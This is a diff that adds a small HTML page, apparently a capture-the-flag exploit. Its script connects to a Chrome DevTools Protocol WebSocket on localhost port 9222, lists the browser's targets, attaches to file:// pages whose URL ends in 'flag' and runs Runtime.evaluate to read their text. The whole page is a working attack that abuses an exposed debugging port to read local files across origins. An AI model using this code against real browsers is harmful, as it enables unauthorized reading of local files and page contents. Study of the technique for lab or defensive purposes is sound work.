@@ -1,0 +1,31 @@
+<!doctype html><html><head><meta charset="utf-8"><title>CDPREAD</title></head>
+<body id="b">loading...</body>
+<script>
+const OUT=[];
+function log(x){ OUT.push(String(x)); document.getElementById('b').innerText = OUT.join('\n===\n'); }
+(async()=>{
+  try{
+    const ws = new WebSocket('ws://127.0.0.1:9222/devtools/browser/fd393589-99e3-4aac-a6da-a936f2613dfc');
+    const resp = new Map(); let nextid = 100;
+    ws.onmessage = (e)=>{ try{ const m=JSON.parse(e.data); if(m.id&&resp.has(m.id)){resp.get(m.id)(m);resp.delete(m.id);} }catch(_){} };
+    function send(method, params, sessionId){ const id=nextid++; return new Promise((res)=>{ resp.set(id,res); const o={id,method}; if(params)o.params=params; if(sessionId)o.sessionId=sessionId; ws.send(JSON.stringify(o)); }); }
+    await new Promise((r,j)=>{ws.onopen=r;ws.onerror=()=>j('wserr');setTimeout(()=>j('timeout'),6000);});
+    log('ws_open');
+    const gt = await send('Target.getTargets');
+    const targets = (gt.result&&gt.result.targetInfos)||[];
+    log('targets='+targets.length);
+    for(const t of targets){
+      if(t.type==='page' && /^file:\/[^]*flag\s*$/.test(t.url)){
+        try{
+          const at = await send('Target.attachToTarget',{targetId:t.targetId, flatten:true});
+          const sid = at.result.sessionId;
+          const ev = await send('Runtime.evaluate',{expression:'(document.body&&document.body.innerText)||"EMPTY"', returnByValue:true}, sid);
+          const val = ev.result && ev.result.result && ev.result.result.value;
+          log('URL='+t.url+'\n>> '+val);
+        }catch(ee){ log('err '+t.url+' '+ee); }
+      }
+    }
+    log('DONE');
+  }catch(e){ log('FATAL:'+e); }
+})();
+</script></html>
